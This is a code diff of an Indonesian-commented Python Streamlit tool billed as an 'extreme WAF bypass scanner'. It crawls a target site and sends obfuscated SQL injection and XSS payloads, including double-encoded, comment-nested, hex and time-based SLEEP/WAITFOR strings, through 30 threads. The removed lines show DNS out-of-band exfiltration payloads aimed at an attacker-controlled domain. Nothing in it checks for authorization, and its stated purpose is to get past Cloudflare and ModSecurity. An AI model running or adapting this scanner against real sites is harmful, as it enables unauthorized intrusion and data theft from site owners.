@@ -3,64 +3,67 @@ import requests
 import re
 import random
 import time
-import hashlib
 import json
-import threading
-import dns.resolver
 from collections import deque, defaultdict
-from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote, unquote
+from urllib.parse import urljoin, urlparse, parse_qs, quote
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass, field
 from typing import List, Dict, Set, Tuple, Optional
 import warnings
 warnings.filterwarnings('ignore')
 
-# ================= KONFIGURASI EXTREME WAF BYPASS =================
-MAX_THREADS = 30                     # Lebih agresif
+# ================= KONFIGURASI =================
+MAX_THREADS = 30
 CRAWL_LIMIT = 300
-REQUEST_TIMEOUT = 5                  # Lebih lama untuk time-based
-MAX_RETRIES = 3
+REQUEST_TIMEOUT = 5
 RATE_LIMIT_DELAY = 0.05
 
-# DNS OOB Server (ganti dengan server collab Anda)
-DNS_OOB_DOMAIN = "your-oob-server.com"
+# ================= DATA CLASSES (HARUS DI AWAL) =================
+@dataclass
+class Vulnerability:
+    url: str
+    param: str
+    payload: str
+    vuln_type: str
+    severity: str
+    confidence: float
+    evidence: str
+    response_time: float
+    status_code: int
+    response_size: int
 
-# ================= ADVANCED WAF BYPASS PAYLOAD DATABASE =================
-# Multi-layer encoding & fragmentasi
+@dataclass
+class ScanResult:
+    target: str
+    vulnerabilities: List[Vulnerability] = field(default_factory=list)
+    crawled_urls: List[str] = field(default_factory=list)
+    scan_time: float = 0
+    waf_detected: bool = False
+    waf_names: List[str] = field(default_factory=list)
+
+# ================= PAYLOAD DATABASE =================
 SQLI_PAYLOADS_BYPASS = [
-    # Double URL encoding
     "'%2520OR%2520'1'%2520%253D%2520'1",
     "'%2520UNION%2520SELECT%2520@@version--",
-    # Hex encoding
-    "0x27204f5220313d3127",   # "' OR 1=1"
-    # Unicode / UTF-16
+    "0x27204f5220313d3127",
     "%u0027%u0020%u004F%u0052%u0020%u0031%u003D%u0031",
-    # Null byte injection (memotong parsing WAF)
     "%00' OR 1=1--",
-    # Komentar bersarang
     "'/*!50000OR*/ 1=1--",
     "' OR 1=1/*!00000*/--",
-    # HTTP Parameter Pollution (HPP)
     "id=1&id=' OR 1=1--",
-    # Time-based dengan delay tidak mencolok
     "' OR SLEEP(2) AND '1'='1",
     "' WAITFOR DELAY '00:00:02'--",
     "' OR IF(1=1, BENCHMARK(5000000,MD5('x')), 0)--",
-    # DNS OOB
-    f"' OR LOAD_FILE('\\\\\\\\{DNS_OOB_DOMAIN}\\\\test')--",
-    f"'; EXEC xp_dirtree '\\\\\\\\{DNS_OOB_DOMAIN}\\\\test'--",
 ]
 
-# XSS dengan WAF bypass
 XSS_BYPASS = [
     "<ScRiPt>alert(1)</ScRiPt>",
     "<img src=x onerror=\"alert(1)\" />",
     "<svg/onload=alert(1)>",
     "javascrip%74:alert(1)",
-    "<a href=\"javas	cript:alert(1)\">click</a>",  # tab injection
 ]
 
-# ================= WAF FINGERPRINTING =================
+# ================= WAF DETECTOR =================
 class AdvancedWAFDetector:
     def __init__(self):
         self.waf_rules = {
@@ -69,204 +72,159 @@ class AdvancedWAFDetector:
             "ModSecurity": ["Mod_Security", "406 Not Acceptable"],
             "Sucuri": ["sucuri", "x-sucuri-id"],
             "Imperva": ["x-iinfo", "incap_ses"],
-            "F5 BIG-IP": ["X-WA-Info", "The requested URL was rejected"],
         }
-        self.active_probe_results = {}  # menyimpan payload apa yang diblokir
 
-    def probe_waf(self, url: str, param: str) -> Dict:
-        """Mengirim probe untuk mengetahui aturan blokir WAF"""
-        probe_payloads = [
-            ("union select", "union%20select"),
-            ("or 1=1", "or%201=1"),
-            ("sleep(5)", "sleep%285%29"),
-            ("'", "%27"),
-            ("\"", "%22"),
-        ]
-        results = {}
-        for name, payload in probe_payloads:
-            test_url = f"{url}?{param}={payload}"
-            try:
-                resp = requests.get(test_url, timeout=5)
-                results[name] = resp.status_code
-            except:
-                results[name] = 500
-        return results
-
-    def detect(self, response: requests.Response) -> Tuple[bool, List[str], Dict]:
+    def detect(self, response: requests.Response) -> Tuple[bool, List[str]]:
         headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
-        detected_wafs = []
+        detected = []
         for waf, sigs in self.waf_rules.items():
             for sig in sigs:
                 if sig in str(headers_lower) or sig in response.text.lower():
-                    detected_wafs.append(waf)
+                    detected.append(waf)
                     break
-        return len(detected_wafs) > 0, detected_wafs, self.active_probe_results
+        return len(detected) > 0, detected
 
-# ================= ADAPTIVE PAYLOAD GENERATOR (WAF BYPASS) =================
+# ================= ADAPTIVE PAYLOAD GENERATOR =================
 class AdaptivePayloadGenerator:
     def __init__(self, waf_type: List[str]):
         self.waf_type = waf_type
         self.bypass_techniques = []
-
         if "Cloudflare" in waf_type:
-            self.bypass_techniques.extend([
-                self.double_url_encode,
-                self.null_byte_injection,
-                self.http_param_pollution,
-            ])
+            self.bypass_techniques.append(self.double_url_encode)
         if "ModSecurity" in waf_type:
-            self.bypass_techniques.extend([
-                self.case_mutation,
-                self.sql_comment_obfuscation,
-                self.unicode_escape,
-            ])
-        # Default jika tidak terdeteksi
+            self.bypass_techniques.append(self.sql_comment_obfuscation)
         if not self.bypass_techniques:
-            self.bypass_techniques = [
-                self.double_url_encode,
-                self.sql_comment_obfuscation,
-                self.time_based_blind,
-                self.dns_oob,
-            ]
+            self.bypass_techniques = [self.double_url_encode, self.sql_comment_obfuscation]
 
     def double_url_encode(self, payload: str) -> str:
         return quote(quote(payload))
 
-    def null_byte_injection(self, payload: str) -> str:
-        return f"%00{payload}"
-
-    def http_param_pollution(self, payload: str) -> str:
-        # Parameter pollution: misal id=1&id=' OR 1=1--
-        return f"dummy=1&original={payload}"
-
-    def case_mutation(self, payload: str) -> str:
-        # Ubah huruf besar/kecil secara acak
-        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)
-
     def sql_comment_obfuscation(self, payload: str) -> str:
-        # Menyisipkan komentar /*! ... */ di tengah kata kunci SQL
-        keywords = ['SELECT', 'UNION', 'OR', 'AND', 'FROM', 'WHERE']
+        keywords = ['SELECT', 'UNION', 'OR', 'AND']
         for kw in keywords:
             if kw in payload.upper():
                 obf = kw[0] + '/*!50000' + kw[1:] + '*/'
                 payload = re.sub(kw, obf, payload, flags=re.IGNORECASE)
         return payload
 
-    def unicode_escape(self, payload: str) -> str:
-        # %u0027 untuk single quote
-        return payload.replace("'", "%u0027").replace('"', "%u0022")
-
-    def time_based_blind(self, payload: str) -> str:
-        # Ubah payload menjadi time-based jika mengandung SLEEP
-        if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
-            return payload
-        # Tambahkan delay yang tidak terlalu mencolok
-        return payload + " AND IF(1=1, SLEEP(2), 0)--"
-
-    def dns_oob(self, payload: str) -> str:
-        # Tambahkan DNS out-of-band
-        return payload.replace("@@version", f"LOAD_FILE('\\\\\\\\{DNS_OOB_DOMAIN}\\\\test')")
-
     def generate(self, base_payloads: List[str]) -> List[str]:
         all_payloads = set(base_payloads)
-        for payload in base_payloads:
-            for technique in self.bypass_techniques:
+        for payload in base_payloads[:20]:
+            for tech in self.bypass_techniques:
                 try:
-                    mutated = technique(payload)
-                    all_payloads.add(mutated)
+                    all_payloads.add(tech(payload))
                 except:
                     pass
         return list(all_payloads)
 
-# ================= TIME-BASED & DNS OOB DETECTOR =================
+# ================= TIME-BASED DETECTOR =================
 class TimeBasedDetector:
     @staticmethod
-    def check_sleep(url: str, param: str, sleep_seconds: int = 3) -> bool:
-        """Kirim payload dengan SLEEP, bandingkan waktu respons"""
+    def check_sleep(url: str, param: str, sleep_seconds: int = 3) -> Tuple[bool, float]:
         payload = f"' OR SLEEP({sleep_seconds})--"
         test_url = f"{url}?{param}={quote(payload)}"
         try:
             start = time.time()
             requests.get(test_url, timeout=sleep_seconds+2)
             elapsed = time.time() - start
-            return elapsed >= sleep_seconds
+            return elapsed >= sleep_seconds, elapsed
         except:
-            return False
+            return False, 0
 
-class DNSOOBDetector:
-    @staticmethod
-    def check_dns_oob(url: str, param: str, domain: str) -> bool:
-        """Kirim payload yang memicu query DNS ke server milik attacker"""
-        # Implementasi sederhana: kita asumsikan ada listener DNS
-        # Di sini kita hanya mengirim payload dan nantinya dicocokkan dengan log server
-        payload = f"' LOAD_FILE('\\\\\\\\{domain}\\\\test')--"
-        test_url = f"{url}?{param}={quote(payload)}"
-        try:
-            requests.get(test_url, timeout=3)
-            # Dalam implementasi nyata, kita perlu mengecek apakah ada DNS query ke domain
-            # Untuk demo, kita return False karena butuh server eksternal
-            return False
-        except:
-            return False
+# ================= CRAWLER SEDERHANA =================
+class IntelligentCrawler:
+    def __init__(self, start_url: str, max_urls: int = 200):
+        self.start_url = start_url
+        self.max_urls = max_urls
+        self.visited = set()
+        self.to_visit = deque([start_url])
+        self.domain = urlparse(start_url).netloc
 
-# ================= EXTREME SCANNER DENGAN WAF BYPASS =================
+    def crawl(self) -> ScanResult:
+        result = ScanResult(target=self.start_url)
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
+        while self.to_visit and len(self.visited) < self.max_urls:
+            current = self.to_visit.popleft()
+            if current in self.visited:
+                continue
+            self.visited.add(current)
+            result.crawled_urls.append(current)
+            try:
+                resp = requests.get(current, timeout=REQUEST_TIMEOUT, headers=headers)
+                links = re.findall(r'href=["\'](.*?)["\']', resp.text)
+                for link in links:
+                    full = urljoin(current, link)
+                    if urlparse(full).netloc == self.domain and full not in self.visited:
+                        self.to_visit.append(full)
+                time.sleep(RATE_LIMIT_DELAY)
+            except:
+                pass
+        return result
+
+# ================= EXTREME SCANNER =================
 class ExtremeWAFBypassScanner:
     def __init__(self, target: str):
         self.target = target
         self.session = requests.Session()
         self.waf_detector = AdvancedWAFDetector()
-        self.results = ScanResult(target=target)
-        self.baseline = {}
+        self.results = ScanResult(target=target)  # SEKARANG SUDAH TERDEFINISI
 
     def scan(self) -> ScanResult:
         start_time = time.time()
-
-        # Phase 1: Crawling
-        st.write("🌐 Phase 1: Deep Crawl + JS/API Discovery")
+        st.write("🌐 Phase 1: Crawling")
         crawler = IntelligentCrawler(self.target, max_urls=CRAWL_LIMIT)
         crawl_result = crawler.crawl()
         self.results.crawled_urls = crawl_result.crawled_urls
 
-        # Phase 2: WAF Fingerprinting
-        st.write("🛡️ Phase 2: WAF Fingerprinting & Adaptive Bypass Preparation")
-        # Ambil satu URL untuk probe
-        test_url = self.results.crawled_urls[0] if self.results.crawled_urls else self.target
-        parsed = urlparse(test_url)
-        first_param = list(parse_qs(parsed.query).keys())[0] if parse_qs(parsed.query) else "id"
-        waf_probe = self.waf_detector.probe_waf(test_url, first_param)
-        # Deteksi WAF dari respons normal
+        if not self.results.crawled_urls:
+            st.error("Tidak ada URL ditemukan")
+            return self.results
+
+        # Ambil URL pertama dengan parameter
+        test_url = None
+        test_param = None
+        for url in self.results.crawled_urls:
+            parsed = urlparse(url)
+            if parse_qs(parsed.query):
+                test_url = url
+                test_param = list(parse_qs(parsed.query).keys())[0]
+                break
+        if not test_url:
+            st.warning("Tidak ada parameter query. Coba URL dengan ?id=1")
+            return self.results
+
+        # Deteksi WAF
+        st.write("🛡️ Phase 2: WAF Detection")
         try:
             resp = self.session.get(test_url, timeout=5)
-            has_waf, waf_names, _ = self.waf_detector.detect(resp)
+            has_waf, waf_names = self.waf_detector.detect(resp)
         except:
             has_waf, waf_names = False, []
+        self.results.waf_detected = has_waf
+        self.results.waf_names = waf_names
+        st.info(f"WAF terdeteksi: {waf_names if waf_names else 'Tidak ada'}")
 
-        st.info(f"Detected WAF: {waf_names if waf_names else 'None'} | Probe results: {waf_probe}")
-
-        # Phase 3: Generate payload khusus bypass WAF
-        st.write("⚡ Phase 3: Generating Adaptive Payloads for WAF Bypass")
+        # Generate payload
+        st.write("⚡ Phase 3: Generate Payloads")
         adapter = AdaptivePayloadGenerator(waf_names)
-        all_payloads = adapter.generate(SQLI_PAYLOADS_BYPASS + XSS_BYPASS)
+        payloads = adapter.generate(SQLI_PAYLOADS_BYPASS + XSS_BYPASS)
 
-        # Phase 4: Scan dengan multiple techniques
-        st.write("💥 Phase 4: Aggressive WAF Bypass Scanning")
+        # Scan
+        st.write("💥 Phase 4: Scanning (Time-based priority if WAF exists)")
         vulnerabilities = []
-
-        # Gunakan Time-based detection jika WAF memblokir anomali
         use_time_based = has_waf
 
         with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
             futures = []
-            for url in self.results.crawled_urls[:100]:
-                parsed_url = urlparse(url)
-                params = parse_qs(parsed_url.query)
+            for url in self.results.crawled_urls[:50]:
+                parsed = urlparse(url)
+                params = parse_qs(parsed.query)
                 for param in params.keys():
                     if use_time_based:
-                        # Prioritaskan time-based
                         futures.append(executor.submit(self.test_time_based, url, param))
                     else:
-                        for payload in all_payloads[:30]:
-                            futures.append(executor.submit(self.test_payload, url, param, payload))
+                        for p in payloads[:20]:
+                            futures.append(executor.submit(self.test_payload, url, param, p))
 
             for future in as_completed(futures):
                 vuln = future.result()
@@ -278,14 +236,14 @@ class ExtremeWAFBypassScanner:
         return self.results
 
     def test_time_based(self, url: str, param: str) -> Optional[Vulnerability]:
-        """Uji dengan time-based blind (tidak terpengaruh respons 403)"""
-        if TimeBasedDetector.check_sleep(url, param, sleep_seconds=3):
+        detected, elapsed = TimeBasedDetector.check_sleep(url, param, 3)
+        if detected:
             return Vulnerability(
                 url=url, param=param, payload="' OR SLEEP(3)--",
                 vuln_type="SQL Injection (Time-based Blind)",
                 severity="HIGH", confidence=0.95,
-                evidence="Response delay detected (3+ seconds)",
-                response_time=3.0, status_code=200, response_size=0
+                evidence=f"Delay {elapsed:.2f}s",
+                response_time=elapsed, status_code=0, response_size=0
             )
         return None
 
@@ -293,14 +251,12 @@ class ExtremeWAFBypassScanner:
         test_url = f"{url}?{param}={quote(payload)}"
         try:
             resp = self.session.get(test_url, timeout=REQUEST_TIMEOUT)
-            # Jika status bukan 403, ada kemungkinan berhasil
             if resp.status_code != 403:
-                # Lakukan analisis anomali
-                if "error" in resp.text.lower() or "mysql" in resp.text.lower():
+                if any(x in resp.text.lower() for x in ['error', 'mysql', 'syntax']):
                     return Vulnerability(
                         url=url, param=param, payload=payload,
-                        vuln_type="SQL Injection", severity="HIGH",
-                        confidence=0.8, evidence=resp.text[:100],
+                        vuln_type="SQL Injection", severity="MEDIUM",
+                        confidence=0.7, evidence=resp.text[:200],
                         response_time=resp.elapsed.total_seconds(),
                         status_code=resp.status_code, response_size=len(resp.text)
                     )
@@ -308,22 +264,23 @@ class ExtremeWAFBypassScanner:
             pass
         return None
 
-# ================= MAIN UI =================
+# ================= MAIN =================
 def main():
-    st.set_page_config(page_title="🔥 EXTREME WAF BYPASS SCANNER", layout="wide")
-    st.title("🔥 EXTREME WAF BYPASS SCANNER v4.0")
-    st.markdown("*Didesain untuk menembus Cloudflare, ModSecurity, dan WAF modern*")
-
-    target = st.text_input("Target URL", placeholder="https://example.com/page.php?id=1")
-    if st.button("🚀 START WAF BYPASS SCAN"):
+    st.set_page_config(page_title="🔥 WAF Bypass Scanner", layout="wide")
+    st.title("🔥 EXTREME WAF BYPASS SCANNER v4.1")
+    target = st.text_input("Target URL (with parameter)", placeholder="https://example.com/page.php?id=1")
+    if st.button("START SCAN"):
         if not target:
-            st.error("Masukkan URL target")
+            st.error("Masukkan URL")
             return
+        if "?" not in target:
+            st.warning("URL harus memiliki parameter query, contoh: ?id=1")
         scanner = ExtremeWAFBypassScanner(target)
-        results = scanner.scan()
-        st.success(f"Scan selesai. Ditemukan {len(results.vulnerabilities)} kerentanan (termasuk yang melewati WAF).")
-        for v in results.vulnerabilities:
-            st.warning(f"**{v.vuln_type}** di `{v.param}` dengan payload `{v.payload}`")
+        with st.spinner("Scanning..."):
+            res = scanner.scan()
+        st.success(f"Selesai dalam {res.scan_time:.2f}s, ditemukan {len(res.vulnerabilities)} kerentanan")
+        for v in res.vulnerabilities:
+            st.error(f"**{v.vuln_type}** di parameter `{v.param}` | Confidence {v.confidence:.0%}")
 
 if __name__ == "__main__":
     main()
